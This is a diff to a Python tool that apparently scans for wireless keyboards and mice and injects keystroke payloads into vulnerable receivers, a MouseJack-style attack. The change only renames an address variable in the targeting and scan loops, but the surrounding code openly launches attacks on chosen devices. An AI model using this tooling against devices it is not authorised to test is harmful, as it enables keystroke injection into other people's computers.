@@ -27,7 +27,7 @@ GR = '\033[37m'  # gray
 
 
 def launch_attacks(jack, targets, attack):
-    for _, target in targets.iteritems():
+    for addr_string, target in targets.iteritems():
         payload  = target['payload']
         channels = target['channels']
         address  = target['address']
@@ -42,17 +42,17 @@ def launch_attacks(jack, targets, attack):
 
             if lock_channel:
                 print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
-                print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.to_display(address), hid.description(), lock_channel))
+                print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (addr_string, hid.description(), lock_channel))
                 jack.attack(hid(address, payload), attack)
             else:
                 # If our pings fail, go full hail mary
                 print(R + '[-] ' + W + 'Ping failed, trying all channels')
                 for channel in channels:
                     jack.set_channel(channel)
-                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.to_display(address), hid.description(), channel))
+                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (addr_string, hid.description(), channel))
                     jack.attack(hid(address, payload), attack)
         else:
-            print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.to_display(address)))
+            print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (addr_string))
             continue
 
 
@@ -70,14 +70,14 @@ def scan_loop(jack, interval, targeted, address):
     print("")
 
     pretty_devices = []
-    for addr, device in jack.devices.iteritems():
+    for addr_string, device in jack.devices.iteritems():
         if device['device']:
             device_name = device['device'].description()
         else:
             device_name = 'Unknown'
         pretty_devices.append([
             device['index'],
-            addr,
+            addr_string,
             ",".join(str(x) for x in device['channels']),
             device['count'],
             str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
@@ -204,9 +204,9 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
         else:
             targets = {}
             target_list = [int(x) for x in value.split(',')]
-            for addr, device in jack.devices.iteritems():
+            for addr_string, device in jack.devices.iteritems():
                 if device['index'] in target_list:
-                    targets[addr] = device
+                    targets[addr_string] = device
 
         launch_attacks(jack, targets, attack)
 
